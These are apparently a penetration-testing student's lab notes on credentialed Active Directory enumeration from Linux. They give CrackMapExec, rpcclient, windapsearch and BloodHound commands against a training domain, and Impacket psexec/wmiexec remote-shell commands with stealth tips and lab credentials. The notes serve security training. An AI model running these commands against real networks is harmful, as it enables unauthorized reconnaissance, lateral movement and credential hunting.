# Section 14 — Credentialed Enumeration from Linux

## Lab Credentials for This Section
- User: `forend` / Password: `Klmcargo2`
- DC: `172.16.5.5`

---

## CrackMapExec (CME / nxc)

### Domain User Enumeration
```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
# Shows badpwdcount per user — filter out accounts near lockout before spraying
```

### Domain Group Enumeration
```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
# Shows member count per group — look for: Domain Admins, Backup Operators, Executives, IT admins
```

### Logged On Users (target file servers, SQL, Exchange)
```bash
crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
# Pwn3d! = local admin on that host
# Look for DA sessions — impersonation opportunity
```

### Share Enumeration
```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
# Look for non-standard shares: Department Shares, User Shares, archive shares
```

### Spider a Share (hunt for sensitive files)
```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
# Output: /tmp/cme_spider_plus/<ip>.json
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json
# Hunt for: web.config, .bat, scripts, password files
```

---

## SMBMap

```bash
# Check share permissions
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

# Recursive directory listing (--dir-only = directories only)
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

---

## rpcclient

```bash
# Connect (NULL session or credentialed)
rpcclient -U "" -N 172.16.5.5                          # NULL session
rpcclient -U "forend%Klmcargo2" 172.16.5.5             # credentialed
```

### Useful rpcclient commands
```
enumdomusers            # list all domain users with RIDs
queryuser 0x457         # query specific user by RID (hex)
enumdomgroups           # list all domain groups
querygroup 0x200        # query specific group by RID
getdompwinfo            # password policy
querydominfo            # domain info
```

### RID explained
- SID + RID = unique object identifier
- `administrator` always = RID `0x1f4` (500 decimal) — universal
- `krbtgt` always = RID `0x1f6` (502)
- Custom users start at RID `0x3e9` (1001+)

---

## Impacket

### psexec.py — SYSTEM shell via SMB (noisy)
```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
# Lands as SYSTEM — uploads random executable to ADMIN$
# Very noisy — creates a service
```

### wmiexec.py — semi-interactive shell via WMI (stealthier)
```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
# Runs as the connecting user (not SYSTEM) — less obvious
# Each command spawns new cmd.exe — generates Event ID 4688
# No files dropped on target
```

| Tool | Noise Level | Runs As | Notes |
|------|-------------|---------|-------|
| psexec.py | High | SYSTEM | Creates service, uploads file |
| wmiexec.py | Medium | Auth user | No files dropped, still logs 4688 |
| smbexec.py | Medium | SYSTEM | Similar to psexec, service-based |

---

## Windapsearch (LDAP enumeration)

```bash
# All domain users
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -U

# All domain computers
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -C

# Domain Admins group members
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

# Privileged users (recursive — catches nested group membership)
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

**`-PU` (privileged users) is key** — finds users who are DA via nested group membership that simple group enumeration misses.

---

## BloodHound.py (Linux ingestor)

```bash
# Collect everything
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all

# Output: JSON files in current directory
# 20220307163102_computers.json
# 20220307163102_domains.json
# 20220307163102_groups.json
# 20220307163102_users.json

# Zip for upload
zip -r ilfreight_bh.zip *.json
```

### Loading into BloodHound GUI
```bash
# Start neo4j database
sudo neo4j start

# Launch BloodHound
bloodhound

# Default creds: neo4j / HTB_@cademy_stdnt!
# Upload zip → Analysis tab → pre-built queries or custom Cypher
```

### Key BloodHound queries to run
- Find Shortest Paths To Domain Admins
- Find All Domain Admins
- Find Principals with DCSync Rights
- Find Computers with Unconstrained Delegation
- Find AS-REP Roastable Users

---

## Credentialed Enumeration Workflow

```bash
# 1. Users + badpwdcount
crackmapexec smb DC_IP -u USER -p PASS --users

# 2. Groups (note high-value groups)
crackmapexec smb DC_IP -u USER -p PASS --groups

# 3. Logged-on users (hunt for DA sessions)
crackmapexec smb FILE_SERVER_IP -u USER -p PASS --loggedon-users

# 4. Shares
crackmapexec smb DC_IP -u USER -p PASS --shares

# 5. Spider interesting shares
crackmapexec smb DC_IP -u USER -p PASS -M spider_plus --share 'SHARE_NAME'

# 6. Privileged users (recursive nested group)
python3 windapsearch.py --dc-ip DC_IP -u USER@DOMAIN -p PASS -PU

# 7. BloodHound full collection
sudo bloodhound-python -u USER -p PASS -ns DC_IP -d DOMAIN -c all
```

---

## Lab Attack Chains

### Find user by RID
```bash
# 1. Convert decimal RID to hex (1170 = 0x492)
# 2. Connect to DC
rpcclient -U "forend%Klmcargo2" 172.16.5.5
# 3. Query the RID
queryuser 0x492
# Result: mmorgan (Matthew Morgan) — also a Domain Admin and AS-REP roastable
```

### Find group member count
```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups | grep -i "Interns"
# Result: Interns membercount: 10
```

---

## Exam Notes

- `Pwn3d!` in CME output = local admin on that host
- `--loggedon-users` against file/SQL/Exchange servers = hunt DA sessions
- Spider shares hunting: web.config, .bat, .ps1, .txt files with "pass" in name
- wmiexec.py is stealthier than psexec.py — prefer it when noise matters
- windapsearch `-PU` = recursive privileged user search — catches nested DAs
- BloodHound `-c all` is the gold standard — run it as soon as you have creds
- WADComs (wadcoms.github.io) = interactive cheat sheet for all these tools
